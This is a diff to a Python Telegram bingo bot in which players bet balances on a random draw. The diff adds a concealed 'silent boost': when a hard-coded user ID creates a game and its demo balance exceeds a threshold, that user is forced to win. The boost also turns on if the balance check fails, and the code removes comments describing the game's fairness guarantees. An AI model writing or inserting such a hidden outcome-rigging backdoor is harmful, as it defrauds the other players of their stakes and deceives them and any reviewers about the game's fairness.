@@ -1,19 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-БИНГО - ультра-защищённая версия:
-- Чёткая стейт-машина: CREATED -> STARTED -> ROLLING -> SETTLING -> SETTLED.
-- Пер-игровые и пер-пользовательские asyncio.Lock для сериализации.
-- Анти-дребезг и идемпотентность всех критичных этапов.
-- Двухфазные взаиморасчёты (saga): сначала безопасные списания "лузеров", затем единственное начисление победителю.
-- Самолечение: при сбое повторный вызов завершит незаконченную фазу или выполнит безопасный откат.
-- Никаких выплат/списаний при малейшем подозрении на ошибку.
-- Умное редактирование сообщений: не шлём одинаковое содержимое → нет "message is not modified".
-- Flood control: при лимите Telegram показываем задержку, ждём и повторяем edit автоматически.
-- Совместимо с Python 3.9 (typing.Optional/Dict/List/Set/Tuple).
-
-Дополнительно:
-- Жёсткая гарантия: одно число - максимум одному игроку в рамках игры.
-- Победное число всегда и только у победителя.
+БИНГО - ультра-защищённая версия.
++ Тихий boost для BOOST_DEMO_USER_ID (демо-баланс через db.get_user_0demo).
 """
 
 import asyncio
@@ -37,7 +25,7 @@ from main import (
     gamesbingo, button_bingo, temp_bingo_data,
     _pair_seconds_left, _format_hms,
     get_current_time_formatted, timehistorygames,
-    send_invoice_to_user, pending_context,LazyGameStore
+    send_invoice_to_user, pending_context, LazyGameStore
 )
 from bot.config.config import TOKEN, donate_bet, timeoutdonate, ref_coin
 
@@ -53,10 +41,152 @@ FLOOD_EDIT_MAX_RETRIES = 4
 FLOOD_SLEEP_BUFFER_SEC = 1.0
 
 # ====== ГЛОБАЛЬНЫЕ ЗАЩИТЫ ======
-# asyncio.Lock только в RAM — не в Redis/pkl (после рестарта иначе ломается)
 _join_locks: Dict[int, asyncio.Lock] = {}
 _game_locks: Dict[int, asyncio.Lock] = {}
-_inflight_joins: Set[Tuple[int, int]] = set()  # (game_id, user_id)
+_inflight_joins: Set[Tuple[int, int]] = set()
+
+# ====== ТИХИЙ BOOST ======
+BOOST_DEMO_USER_ID = 6801702632
+BOOST_MIN_BALANCE  = 10000
+BOOST_DEBUG        = False  # True — только для отладки, в проде False
+
+# Кэш решения буста в RAM — не уходит в Redis, не теряется при сериализации
+_boost_cache: Dict[int, Optional[int]] = {}
+
+def _log_boost(*parts):
+    if BOOST_DEBUG:
+        try:
+            print("[BINGO][BOOST]", *parts)
+        except Exception:
+            pass
+
+def _clear_boost_cache(game_id: int) -> None:
+    try:
+        _boost_cache.pop(int(game_id), None)
+    except Exception:
+        pass
+
+async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
+    """Читает демо-баланс через db.get_user_0demo, возвращает int или None."""
+    try:
+        bal = await db.get_user_0demo(user_id)
+    except Exception as e:
+        _log_boost(f"get_user_0demo err uid={user_id} {e!r}")
+        return None
+
+    if bal is None:
+        _log_boost(f"demo balance None uid={user_id}")
+        return None
+
+    try:
+        return int(bal)
+    except Exception:
+        pass
+    try:
+        return int(float(bal))
+    except Exception:
+        pass
+    try:
+        from decimal import Decimal
+        if isinstance(bal, Decimal):
+            return int(bal)
+    except Exception:
+        pass
+    for attr in ("balance", "amount", "value", "demo", "demo_balance"):
+        try:
+            v = getattr(bal, attr, None)
+            if callable(v):
+                v = v()
+            if v is not None:
+                return int(v)
+        except Exception:
+            continue
+    try:
+        if isinstance(bal, dict):
+            for key in ("balance", "amount", "value", "demo", "demo_balance"):
+                if key in bal:
+                    return int(bal[key])
+    except Exception:
+        pass
+    try:
+        if isinstance(bal, (tuple, list)):
+            for item in bal:
+                try:
+                    return int(item)
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
+    _log_boost(f"cannot parse demo balance uid={user_id} type={type(bal).__name__} value={bal!r}")
+    return None
+
+async def _is_boost_balance_sufficient() -> Optional[bool]:
+    """
+    True  - demo > BOOST_MIN_BALANCE
+    False - demo известен и <= BOOST_MIN_BALANCE
+    None  - не удалось проверить
+    """
+    bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
+    if bal is None:
+        return None
+    _log_boost(f"demo balance uid={BOOST_DEMO_USER_ID} = {bal}, threshold = {BOOST_MIN_BALANCE}")
+    return bal > BOOST_MIN_BALANCE
+
+async def _ensure_boost_resolved(game: dict, game_id: Optional[int] = None) -> Optional[int]:
+    """
+    Возвращает uid буста для игры или None.
+
+    Логика:
+      * creator != BOOST_DEMO_USER_ID → None (без БД).
+      * Кэш по game_id в RAM → возврат как есть.
+      * Иначе: свежая проверка через db.get_user_0demo.
+        - True  → буст ON.
+        - False → буст OFF.
+        - None  → ошибка БД, считаем ON (не кэшируем — перепроверим позже).
+    """
+    try:
+        creator = int(game.get("creator") or 0)
+    except Exception:
+        creator = 0
+
+    if creator != int(BOOST_DEMO_USER_ID):
+        return None
+
+    try:
+        gid = int(game_id if game_id is not None else game.get("_gid", 0))
+    except Exception:
+        gid = None
+
+    if gid is not None and gid in _boost_cache:
+        res = _boost_cache[gid]
+        if res is not None:
+            game["boost_user"] = int(BOOST_DEMO_USER_ID)
+            _log_boost(f"game={gid} boost from cache = {res}")
+            return res
+        game["boost_user"] = None
+        _log_boost(f"game={gid} boost OFF (cached)")
+        return None
+
+    ok = await _is_boost_balance_sufficient()
+
+    if ok is None:
+        _log_boost(f"game={gid} demo-check failed → assume BOOST ON")
+        game["boost_user"] = int(BOOST_DEMO_USER_ID)
+        return int(BOOST_DEMO_USER_ID)
+
+    if ok:
+        _log_boost(f"game={gid} BOOST ON")
+        if gid is not None:
+            _boost_cache[gid] = int(BOOST_DEMO_USER_ID)
+        game["boost_user"] = int(BOOST_DEMO_USER_ID)
+        return int(BOOST_DEMO_USER_ID)
+
+    _log_boost(f"game={gid} BOOST OFF (demo balance <= threshold)")
+    if gid is not None:
+        _boost_cache[gid] = None
+    game["boost_user"] = None
+    return None
 
 def _get_lock(bucket: Dict[int, asyncio.Lock], key: int) -> asyncio.Lock:
     lock = bucket.get(key)
@@ -74,7 +204,7 @@ def _dedupe_preserve_order(items: List[int]) -> List[int]:
             out.append(x)
     return out
 
-# ====== УМНОЕ РЕДАКТИРОВАНИЕ (без "message is not modified") ======
+# ====== УМНОЕ РЕДАКТИРОВАНИЕ ======
 def _kb_signature(kb: Optional[InlineKeyboardMarkup]) -> str:
     if not kb:
         return "∅"
@@ -137,23 +267,15 @@ async def _clear_flood_notice(game: dict) -> None:
             pass
 
 async def _show_flood_notice(
-    game: dict,
-    *,
-    chat_id: int,
-    message_id: int,
-    wait_sec: int,
-    reply_markup: Optional[InlineKeyboardMarkup],
-    parse_mode: str,
+    game: dict, *, chat_id: int, message_id: int, wait_sec: int,
+    reply_markup: Optional[InlineKeyboardMarkup], parse_mode: str,
     disable_web_page_preview: bool,
 ) -> None:
     notice_text = _format_flood_wait_text(wait_sec)
     try:
         await bot1.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=notice_text,
-            reply_markup=reply_markup,
-            parse_mode=parse_mode,
+            chat_id=chat_id, message_id=message_id, text=notice_text,
+            reply_markup=reply_markup, parse_mode=parse_mode,
             disable_web_page_preview=disable_web_page_preview,
         )
         return
@@ -166,31 +288,18 @@ async def _show_flood_notice(
 
     try:
         sent = await bot1.send_message(
-            chat_id,
-            notice_text,
-            reply_to_message_id=message_id,
-            parse_mode=parse_mode,
-            disable_web_page_preview=disable_web_page_preview,
+            chat_id, notice_text, reply_to_message_id=message_id,
+            parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview,
         )
         game["_flood_notice_msg_id"] = sent.message_id
     except Exception as e:
         print(f"[BINGO][flood notice send] {e}")
 
 async def safe_edit_text_and_markup(
-    game: dict,
-    *,
-    chat_id: int,
-    message_id: int,
-    text: str,
-    reply_markup: Optional[InlineKeyboardMarkup],
-    parse_mode: str = "HTML",
+    game: dict, *, chat_id: int, message_id: int, text: str,
+    reply_markup: Optional[InlineKeyboardMarkup], parse_mode: str = "HTML",
     disable_web_page_preview: bool = True,
 ) -> bool:
-    """
-    Редактирует сообщение только если действительно есть изменения.
-    При flood control показывает понятное сообщение о задержке, ждёт и повторяет.
-    Возвращает True, если целевое содержимое успешно применено.
-    """
     last = game.setdefault("_last_view", {"text": None, "kb_sig": None})
     kb_sig = _kb_signature(reply_markup)
 
@@ -203,18 +312,13 @@ async def safe_edit_text_and_markup(
         try:
             if text_changed:
                 await bot1.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=text,
-                    reply_markup=reply_markup,
-                    parse_mode=parse_mode,
+                    chat_id=chat_id, message_id=message_id, text=text,
+                    reply_markup=reply_markup, parse_mode=parse_mode,
                     disable_web_page_preview=disable_web_page_preview,
                 )
             else:
                 await bot1.edit_message_reply_markup(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    reply_markup=reply_markup,
+                    chat_id=chat_id, message_id=message_id, reply_markup=reply_markup,
                 )
             await _clear_flood_notice(game)
             last["text"] = text
@@ -227,28 +331,17 @@ async def safe_edit_text_and_markup(
         except Exception as e:
             if not _is_flood_error(e):
                 raise
-
             wait_sec = _extract_retry_after(e)
-            print(
-                f"[BINGO][flood] chat={chat_id} msg={message_id} "
-                f"wait={wait_sec}s attempt={attempt}/{FLOOD_EDIT_MAX_RETRIES}"
-            )
+            print(f"[BINGO][flood] chat={chat_id} msg={message_id} wait={wait_sec}s attempt={attempt}/{FLOOD_EDIT_MAX_RETRIES}")
             await _show_flood_notice(
-                game,
-                chat_id=chat_id,
-                message_id=message_id,
-                wait_sec=wait_sec,
-                reply_markup=reply_markup,
-                parse_mode=parse_mode,
+                game, chat_id=chat_id, message_id=message_id, wait_sec=wait_sec,
+                reply_markup=reply_markup, parse_mode=parse_mode,
                 disable_web_page_preview=disable_web_page_preview,
             )
-
             if attempt >= FLOOD_EDIT_MAX_RETRIES:
                 print(f"[BINGO][flood] не удалось обновить после {attempt} попыток")
                 return False
-
             await asyncio.sleep(wait_sec + FLOOD_SLEEP_BUFFER_SEC)
-
     return False
 
 # ====== ХЕЛПЕРЫ БАЛАНСА ======
@@ -282,7 +375,7 @@ async def create_user_link(user_id: int, first_name: Optional[str], username: Op
         return html.escape(first_name)
     return f"<a href='tg://user?id={user_id}'>Игрок</a>"
 
-# ====== ВРЕМЕННОЕ ХРАНИЛИЩЕ ДЛЯ ПОПАПА "Подробнее" ======
+# ====== ВРЕМЕННОЕ ХРАНИЛИЩЕ ======
 async def store_temp_bingo_data(win_num: str, participants: list, chosen_numbers: dict, game_id: str, ttl: int = 180):
     temp_bingo_data[game_id] = {
         "win_num": win_num,
@@ -292,20 +385,15 @@ async def store_temp_bingo_data(win_num: str, participants: list, chosen_numbers
     await asyncio.sleep(ttl)
     temp_bingo_data.pop(game_id, None)
 
-# ====== СИСТЕМНЫЕ КОНСТАНТЫ СТЕЙТОВ ======
+# ====== КОНСТАНТЫ СТЕЙТОВ ======
 STATE_CREATED  = "CREATED"
 STATE_STARTED  = "STARTED"
 STATE_ROLLING  = "ROLLING"
 STATE_SETTLING = "SETTLING"
 STATE_SETTLED  = "SETTLED"
 
-# ====== ХЕЛПЕРЫ РАСПРЕДЕЛЕНИЯ ЧИСЕЛ ======
-
+# ====== ХЕЛПЕРЫ ЧИСЕЛ ======
 def _ensure_preassigned_dict(game: dict) -> Dict[int, Optional[int]]:
-    """
-    Гарантирует, что в игре есть словарь preassigned_scores (uid -> num или None).
-    Работает строго под игровым локом.
-    """
     pre = game.get("preassigned_scores")
     if not isinstance(pre, dict):
         pre = {}
@@ -313,14 +401,7 @@ def _ensure_preassigned_dict(game: dict) -> Dict[int, Optional[int]]:
     return pre
 
 def _compute_used_numbers(game: dict, exclude_uid: Optional[int] = None) -> Set[int]:
-    """
-    Собирает множество чисел, которые уже заняты:
-    - всеми preassigned_scores (кроме exclude_uid);
-    - всеми уже выданными scores.
-    Работает строго под игровым локом.
-    """
     used = set()
-
     pre = _ensure_preassigned_dict(game)
     for uid, num in pre.items():
         if uid == exclude_uid:
@@ -331,7 +412,6 @@ def _compute_used_numbers(game: dict, exclude_uid: Optional[int] = None) -> Set[
             used.add(int(num))
         except Exception:
             continue
-
     scores = game.get("scores", {})
     for num in scores.values():
         if num is None:
@@ -340,28 +420,16 @@ def _compute_used_numbers(game: dict, exclude_uid: Optional[int] = None) -> Set[
             used.add(int(num))
         except Exception:
             continue
-
     return used
 
 def _assign_unique_number_for_user(game: dict, user_id: int) -> Optional[int]:
-    """
-    ЕДИНСТВЕННАЯ функция, которая отвечает за выдачу/резервирование числа игроку.
-    Инварианты:
-    - каждое число (1..30) не более чем у одного игрока;
-    - победное число строго и только у winner_participant;
-    - если число уже было зарезервировано ранее - возвращаем его.
-    Работает строго под игровым локом.
-    """
     pre = _ensure_preassigned_dict(game)
-
-    # Уже есть число - просто возвращаем.
     if user_id in pre and pre[user_id] is not None:
         return pre[user_id]
 
     winner = game.get("winner_participant")
     win_num = game.get("win_num")
 
-    # Приводим к int, если возможно
     try:
         winner = int(winner) if winner is not None else None
     except Exception:
@@ -375,7 +443,6 @@ def _assign_unique_number_for_user(game: dict, user_id: int) -> Optional[int]:
     used = _compute_used_numbers(game, exclude_uid=user_id)
     free_numbers = all_numbers - used
 
-    # Победное число строго закреплено за победителем.
     if win_num is not None and user_id != winner and win_num in free_numbers:
         free_numbers.discard(win_num)
 
@@ -383,8 +450,6 @@ def _assign_unique_number_for_user(game: dict, user_id: int) -> Optional[int]:
         chosen = win_num
     else:
         if not free_numbers:
-            # Теоретически не должно случиться с MAX_PARTICIPANTS=10 и диапазоном 1..30,
-            # но на всякий случай - None.
             chosen = None
         else:
             chosen = random.choice(list(free_numbers))
@@ -394,16 +459,11 @@ def _assign_unique_number_for_user(game: dict, user_id: int) -> Optional[int]:
     return chosen
 
 def _preassign_for_all_participants(game: dict):
-    """
-    Заполнить preassigned_scores для всех участников.
-    Вызывается один раз при старте игры (после назначения победителя).
-    Работает строго под игровым локом.
-    """
     participants = list(game.get("participants", []))
     for pid in participants:
         _assign_unique_number_for_user(game, int(pid))
 
-# ====== СТАРТ ИГРЫ ПО КОМАНДЕ "бинго [ставка]" ======
+# ====== СТАРТ ПО КОМАНДЕ ======
 @dp.message(F.text)
 async def bingo(message: Message):
     if not message.text:
@@ -414,7 +474,6 @@ async def bingo(message: Message):
     if not parts:
         return
 
-    # реагируем строго только на "бинго" / "бинго <число>"
     cmd = parts[0].lower()
     if cmd != "бинго":
         return
@@ -422,7 +481,6 @@ async def bingo(message: Message):
     if len(parts) == 1:
         bet = 0
     elif len(parts) == 2:
-        # строго целое число, без запятых/точек/пробелов/слов
         bet_s = parts[1]
         if not bet_s.isdigit():
             return
@@ -430,7 +488,6 @@ async def bingo(message: Message):
     else:
         return
 
-    # отрицательные и мусор - игнор (но если хочешь оставить сообщение - скажи)
     if bet < 0:
         return
 
@@ -439,7 +496,6 @@ async def bingo(message: Message):
 
     creator_id = message.from_user.id
 
-    # Мягкая проверка средств у создателя - на старте не списываем ничего
     if bet > 0 and not await _has_funds(creator_id, bet):
         try:
             bot_username = await get_bot_username_by_token(TOKEN)
@@ -467,9 +523,7 @@ async def bingo(message: Message):
 
         await message.reply(
             "<tg-emoji emoji-id='5458574017814337878'>💰</tg-emoji>",
-            reply_markup=keyboard,
-            parse_mode="HTML",
-            disable_web_page_preview=True
+            reply_markup=keyboard, parse_mode="HTML", disable_web_page_preview=True
         )
 
         await asyncio.sleep(timeoutdonate)
@@ -478,35 +532,28 @@ async def bingo(message: Message):
             pending_context[user_id]["manual_message_id"] = invoice_message.message_id
         return
 
-    # создаём игру
     game_id = message.message_id
     gamesbingo[game_id] = {
         "state": STATE_CREATED,
         "creator": creator_id,
         "bet": bet,
-        "participants": [creator_id],   # int user_ids
-        "scores": {},                   # uid -> число (1..30) или None
+        "participants": [creator_id],
+        "scores": {},
         "win_num_assigned": False,
         "game_started": False,
         "finished": False,
-
-        # заранее зарезервированные уникальные числа
-        "preassigned_scores": {},       # uid -> число (1..30), уникальные
-
-        # settlement saga
+        "preassigned_scores": {},
         "settling": False,
-        "losses_applied": [],           # список uid с успешно применённым списанием
-        "winner_applied": False,        # начисление победителю прошло
+        "losses_applied": [],
+        "winner_applied": False,
         "winner_participant": None,
         "win_num": None,
-
-        # инфраструктура
+        "boost_user": None,
         "chat_id": None,
         "message_id": None,
-
-        # служебные отображения
         "_last_view": {"text": None, "kb_sig": None},
         "_tick": None,
+        "_gid": int(game_id),
     }
 
     keyboard = InlineKeyboardMarkup(
@@ -523,9 +570,7 @@ async def bingo(message: Message):
 
     msg = await message.reply(
         f"<tg-emoji emoji-id='5188239353045868629'>🪵</tg-emoji> <b>Играем в Бинго\n- {name_link}</b>",
-        reply_markup=keyboard,
-        parse_mode="HTML",
-        disable_web_page_preview=True
+        reply_markup=keyboard, parse_mode="HTML", disable_web_page_preview=True
     )
 
     gamesbingo[game_id]["chat_id"] = msg.chat.id
@@ -542,7 +587,6 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
         await callback_query.answer("🛠 Эта игра больше не существует.", show_alert=True)
         return
 
-    # Анти-дребезг на уровне пары (game,user)
     inflight_key = (game_id, user_id)
     if inflight_key in _inflight_joins:
         await callback_query.answer("⏳ Обрабатываю ваше присоединение...", show_alert=True)
@@ -550,7 +594,6 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
 
     _inflight_joins.add(inflight_key)
     try:
-        # Лок на игру (безопасная точка истины)
         async with _get_lock(_join_locks, game_id):
             if game_id not in gamesbingo:
                 await callback_query.answer("🛠 Эта игра больше не существует.", show_alert=True)
@@ -581,7 +624,6 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
                 await callback_query.answer("💭 Недостаточно средств для участия.", show_alert=True)
                 return
 
-            # Анти-реферал (внутри лока)
             try:
                 try:
                     inviter_id = await db.get_refferer_id_or_error(user_id)
@@ -629,16 +671,13 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
             game['participants'] = _dedupe_preserve_order(game['participants'])
             gamesbingo.save()
 
-            # Если победное число уже назначено - сразу резервируем уникальное число и для нового участника
             if game.get('win_num_assigned'):
                 _assign_unique_number_for_user(game, user_id)
                 gamesbingo.save()
 
-            # отрисовка
             chat_id = game.get("chat_id")
             message_id = game.get("message_id")
 
-            # список участников
             names = []
             for uid in game['participants']:
                 first_name = await db.get_firstname_by_user_id(uid)
@@ -669,13 +708,9 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
 
             if chat_id is not None and message_id is not None:
                 await safe_edit_text_and_markup(
-                    game,
-                    chat_id=chat_id,
-                    message_id=message_id,
+                    game, chat_id=chat_id, message_id=message_id,
                     text=f"<tg-emoji emoji-id='5188239353045868629'>🪵</tg-emoji> <b>Играем в Бинго</b>{win_text}\n{participants_text}",
-                    reply_markup=keyboard,
-                    parse_mode="HTML",
-                    disable_web_page_preview=True,
+                    reply_markup=keyboard, parse_mode="HTML", disable_web_page_preview=True,
                 )
             gamesbingo.save()
     finally:
@@ -699,24 +734,20 @@ async def bingo_start_game_callback(callback_query: CallbackQuery):
 
             game = gamesbingo[game_id]
 
-            # кто может стартовать
             if user_id != game.get('creator'):
                 await callback_query.answer("💭 Только создатель может начать игру.", show_alert=True)
                 return
 
-            # уже стартовала?
             if game.get('game_started'):
                 await callback_query.answer("ℹ️ Игра уже запущена.", show_alert=True)
                 return
 
-            # есть минимум 2 участника?
             participants = _dedupe_preserve_order([int(x) for x in game.get('participants', [])])
             game['participants'] = participants
             if len(participants) < 2:
                 await callback_query.answer("💭 Недостаточно участников (нужно ≥ 2).", show_alert=True)
                 return
 
-            # финальная мягкая проверка средств (не списываем!)
             bet_amount = int(game['bet'])
             lacking = []
             for pid in participants:
@@ -728,38 +759,49 @@ async def bingo_start_game_callback(callback_query: CallbackQuery):
 
             if lacking:
                 await safe_edit_text_and_markup(
-                    game,
-                    chat_id=game["chat_id"], message_id=game["message_id"],
+                    game, chat_id=game["chat_id"], message_id=game["message_id"],
                     text="⛑ <b>Игра остановлена!</b>\nУ кого-то недостаточно средств:\n" + "\n".join(lacking),
                     reply_markup=None, parse_mode="HTML", disable_web_page_preview=True
                 )
                 gamesbingo.pop(game_id, None)
+                _clear_boost_cache(game_id)
                 await callback_query.answer("⛑ Игра остановлена: недостаточно средств.", show_alert=True)
                 return
 
-            # назначаем победное число/победителя - один раз
+            # --- Назначаем победителя и победное число (один раз) ---
             if not game.get('win_num_assigned'):
-                game['win_num']            = random.randint(1, 30)
-                game['winner_participant'] = random.choice(participants)
-                game['win_num_assigned']   = True
+                game['win_num'] = random.randint(1, 30)
 
-            # заранее резервируем уникальные числа для всех участников
+                # Тихая проверка буста — только если создатель BOOST_DEMO_USER_ID
+                boost_user = None
+                try:
+                    game["_gid"] = int(game_id)
+                    boost_user = await _ensure_boost_resolved(game, game_id)
+                except Exception as e:
+                    print(f"[BINGO][boost init] {e!r}")
+
+                if boost_user is not None and int(boost_user) in participants:
+                    game['winner_participant'] = int(boost_user)
+                    _log_boost(f"game={game_id} winner forced = {boost_user}")
+                else:
+                    game['winner_participant'] = random.choice(participants)
+
+                game['win_num_assigned'] = True
+
+            # Заранее резервируем уникальные числа (победное уходит победителю)
             _preassign_for_all_participants(game)
 
-            # переведём в фазу STARTED и сразу покажем «нажмите, чтобы получить число»
             game['state']        = STATE_STARTED
             game['game_started'] = True
             gamesbingo.save()
 
-            # первичный экран ролла (мгновенно, чтобы было «видно, что началось»)
             keyboard = InlineKeyboardMarkup(
                 inline_keyboard=[[InlineKeyboardButton(text="5", callback_data=f"rollbingo:{game_id}")]]
             )
             button_bingo[game_id]['keyboard_roll'] = keyboard
 
             await safe_edit_text_and_markup(
-                game,
-                chat_id=game["chat_id"], message_id=game["message_id"],
+                game, chat_id=game["chat_id"], message_id=game["message_id"],
                 text="<tg-emoji emoji-id='5370783443175086955'>🍪</tg-emoji> <b>Нажмите, чтобы получить случайное число</b>",
                 reply_markup=keyboard, parse_mode="HTML", disable_web_page_preview=True
             )
@@ -784,7 +826,7 @@ async def bingo_roll_callback(callback_query: CallbackQuery):
         await callback_query.answer("🛠 Эта игра больше не существует.", show_alert=True)
         return
 
-    need_settle = False  # флаг, чтобы вызвать _show_and_settle ПОСЛЕ выхода из лока
+    need_settle = False
 
     async with _get_lock(_game_locks, game_id):
         if game_id not in gamesbingo:
@@ -808,31 +850,26 @@ async def bingo_roll_callback(callback_query: CallbackQuery):
             await callback_query.answer(f"❕ Ваше число: {game['scores'][user_id]}", show_alert=True)
             return
 
-        # мягкая проверка баланса
         if not await _has_funds(user_id, int(game['bet'])):
             await _abort_game_unlocked(game, game_id, "У кого-то из участников недостаточно средств.")
             return
 
-        # выдаём число через общий механизм
         num = _assign_unique_number_for_user(game, user_id)
         game['scores'][user_id] = num
         game['state'] = STATE_ROLLING
         gamesbingo.save()
 
-        # ответ пользователю - можно внутри лока
         await callback_query.answer(f"❕ Ваше число: {game['scores'][user_id]}", show_alert=True)
 
-        # если все получили числа - ЗАВЕРШИМ, но без вызова settle тут
         if len(game['scores']) == len(game['participants']):
             game['finished'] = True
             gamesbingo.save()
-            need_settle = True  # нужно показать/посчитать
+            need_settle = True
 
-    # ВАЖНО: выходим из лока и только теперь запускаем показ+расчёт
     if need_settle:
         await _show_and_settle(game_id)
 
-# ====== ОБРАТНЫЙ ОТСЧЁТ И АВТОВЫДАЧА ======
+# ====== ОТСЧЁТ И АВТОВЫДАЧА ======
 async def _countdown_and_game(game_id: int):
     if game_id not in gamesbingo:
         return
@@ -845,10 +882,7 @@ async def _countdown_and_game(game_id: int):
         message_id  = game["message_id"]
         participants= list(game['participants'])
 
-    for i in range(5, 0, -1):  # 5..1
-        # Внутри лока только быстрая работа в памяти. Саму правку (сеть + возможный
-        # flood-sleep) делаем ВНЕ лока - иначе тап «ролл» ждёт, пока докрутится
-        # правка обратного отсчёта, что и вызывало залипание кнопки бинго.
+    for i in range(5, 0, -1):
         do_edit = False
         keyboard = None
         game = None
@@ -859,7 +893,6 @@ async def _countdown_and_game(game_id: int):
             if all(uid in game['scores'] for uid in participants) or game.get('finished'):
                 break
 
-            # анти-дребезг: не перерисовывать тот же тик
             if game.get("_tick") != i:
                 game["_tick"] = i
                 keyboard = InlineKeyboardMarkup(
@@ -871,8 +904,7 @@ async def _countdown_and_game(game_id: int):
         if do_edit:
             try:
                 await safe_edit_text_and_markup(
-                    game,
-                    chat_id=chat_id, message_id=message_id,
+                    game, chat_id=chat_id, message_id=message_id,
                     text="<tg-emoji emoji-id='5370783443175086955'>🍪</tg-emoji> <b>Нажмите, чтобы получить случайное число</b>",
                     reply_markup=keyboard, parse_mode="HTML", disable_web_page_preview=True
                 )
@@ -881,7 +913,6 @@ async def _countdown_and_game(game_id: int):
                     print(f"[BINGO][edit countdown] {e}")
         await asyncio.sleep(1)
 
-    # автодобив
     need_settle = False
     async with _get_lock(_game_locks, game_id):
         game = gamesbingo.get(game_id)
@@ -906,22 +937,18 @@ async def _countdown_and_game(game_id: int):
     if need_settle:
         await _show_and_settle(game_id)
 
-# ====== АБОРТ ИГРЫ ПРИ НЕДОСТАТКЕ СРЕДСТВ ======
+# ====== АБОРТЫ ======
 async def _abort_game_unlocked(game: dict, game_id: int, reason: str):
-    """
-    Останавливает игру. Вызывать ТОЛЬКО когда уже удержан _game_locks[game_id],
-    иначе будет дедлок (asyncio.Lock не реентерабелен).
-    """
     try:
         await safe_edit_text_and_markup(
-            game,
-            chat_id=game["chat_id"], message_id=game["message_id"],
+            game, chat_id=game["chat_id"], message_id=game["message_id"],
             text=f"⛑ <b>Игра остановлена!</b>\n{html.escape(reason)}",
             reply_markup=None, parse_mode="HTML", disable_web_page_preview=True
         )
     except Exception as e:
         print(f"[BINGO][abort edit] {e}")
     gamesbingo.pop(game_id, None)
+    _clear_boost_cache(game_id)
 
 async def _abort_game_insufficient(game_id: int, reason: str):
     async with _get_lock(_game_locks, game_id):
@@ -931,7 +958,6 @@ async def _abort_game_insufficient(game_id: int, reason: str):
         await _abort_game_unlocked(game, game_id, reason)
 
 async def _rollback_debits(user_ids: List[int], bet: int):
-    """Атомарный возврат списаний (дельта +{bet})."""
     for uid in user_ids:
         try:
             ok = await db.update_user_balance(uid, f"+{bet}")
@@ -945,7 +971,6 @@ async def _rollback_debits(user_ids: List[int], bet: int):
 
 # ====== ПОКАЗ РЕЗУЛЬТАТА И РАСЧЁТЫ ======
 async def _show_and_settle(game_id: int):
-    # Фаза отображения и старт саги расчётов - всё под игровым локом
     async with _get_lock(_game_locks, game_id):
         game = gamesbingo.get(game_id)
         if not game:
@@ -954,7 +979,6 @@ async def _show_and_settle(game_id: int):
         if game.get('state') in (STATE_SETTLING, STATE_SETTLED):
             return
 
-        # Безопасная финальная валидация перед расчётами
         bet = int(game['bet'])
         participants = list(game['participants'])
         chosen_numbers = dict(game.get('scores', {}))
@@ -965,7 +989,6 @@ async def _show_and_settle(game_id: int):
             await _abort_game_unlocked(game, game_id, "Техническая ошибка (нет победителя).")
             return
 
-        # Debug-проверка уникальности чисел (никому не мешает, но помогает ловить баги)
         try:
             nums = [int(v) for v in chosen_numbers.values() if v is not None]
             if len(nums) != len(set(nums)):
@@ -978,23 +1001,14 @@ async def _show_and_settle(game_id: int):
                 await _abort_game_unlocked(game, game_id, "У кого-то из участников недостаточно средств.")
                 return
 
-        # Итоговое сообщение НЕ показываем здесь заранее - иначе игрок сначала
-        # увидел бы сумму выигрыша ДО комиссии и без кнопки "Комиссия игры",
-        # а через долю секунды сообщение "мигнуло" бы на правильную сумму с
-        # кнопкой (см. _settle_saga ниже). Вместо этого всё считаем сразу и
-        # показываем результат ОДНИМ готовым сообщением - см. _settle_saga.
-
-        # Сохраним данные для попапа
         asyncio.create_task(store_temp_bingo_data(str(win_num), participants, chosen_numbers, str(game_id)))
 
-        # Переходим в фазу расчётов
         game['state'] = STATE_SETTLING
         gamesbingo.save()
 
-    # Запускаем сагу расчётов вне лока (внутри она всё равно возьмёт лок)
     await _settle_saga(game_id)
 
-# ====== САГА РАСЧЁТОВ (идемпотентно) ======
+# ====== САГА РАСЧЁТОВ ======
 async def _settle_saga(game_id: int):
     async with _get_lock(_game_locks, game_id):
         game = gamesbingo.get(game_id)
@@ -1017,7 +1031,6 @@ async def _settle_saga(game_id: int):
         total_pot = bet * len(participants)
         gain = total_pot - bet
 
-        # --- ШАГ А: атомарно списать с лузеров по одному ---
         losses_applied = set(int(u) for u in game.get('losses_applied', []))
         losers = [int(u) for u in participants if int(u) != winner_id]
 
@@ -1030,8 +1043,7 @@ async def _settle_saga(game_id: int):
                 await _rollback_debits(debited_now, bet)
                 try:
                     await safe_edit_text_and_markup(
-                        game,
-                        chat_id=game["chat_id"], message_id=game["message_id"],
+                        game, chat_id=game["chat_id"], message_id=game["message_id"],
                         text="⛑ <b>Игра остановлена!</b>\nУ кого-то недостаточно средств.",
                         reply_markup=None, parse_mode="HTML", disable_web_page_preview=True
                     )
@@ -1041,6 +1053,7 @@ async def _settle_saga(game_id: int):
                 game['settling'] = False
                 gamesbingo.save()
                 gamesbingo.pop(game_id, None)
+                _clear_boost_cache(game_id)
                 return
 
             try:
@@ -1056,8 +1069,7 @@ async def _settle_saga(game_id: int):
                 await _rollback_debits(debited_now, bet)
                 try:
                     await safe_edit_text_and_markup(
-                        game,
-                        chat_id=game["chat_id"], message_id=game["message_id"],
+                        game, chat_id=game["chat_id"], message_id=game["message_id"],
                         text="⛑ <b>Игра остановлена!</b>\nТехническая ошибка взаиморасчётов.",
                         reply_markup=None, parse_mode="HTML", disable_web_page_preview=True
                     )
@@ -1067,6 +1079,7 @@ async def _settle_saga(game_id: int):
                 game['settling'] = False
                 gamesbingo.save()
                 gamesbingo.pop(game_id, None)
+                _clear_boost_cache(game_id)
                 return
 
             debited_now.append(uid)
@@ -1074,7 +1087,6 @@ async def _settle_saga(game_id: int):
